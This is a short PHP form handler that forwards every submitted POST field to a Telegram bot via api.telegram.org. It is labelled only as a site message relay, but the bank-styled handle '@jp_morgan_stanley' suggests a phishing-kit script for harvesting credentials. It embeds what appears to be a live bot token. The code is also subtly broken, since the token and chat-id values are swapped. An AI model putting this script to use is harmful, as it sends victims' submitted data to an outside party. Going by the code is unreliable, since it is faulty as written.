<?php
	$content = '';
	foreach ($_POST as $key => $value) {
		if($value){
			$content .= "<b>$key</b>: <i>$value</i>\n";
		}
	}
	if(trim($content)){
		$content = "<b>Message from Site:</b>\n".$content;
		// Your bot's token that got from @BotFather
		$apiToken = "@jp_morgan_stanley";
		$data = [
			// The user's(that you want to send a message) telegram chat id
			'chat_id' => '6513365725:AAE6WhxSuUKa1uXS8FdHuHV0c9CiEVD0GV4',
			'text' => $content,
			'parse_mode' => 'HTML'
		];
		$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
	}
?>
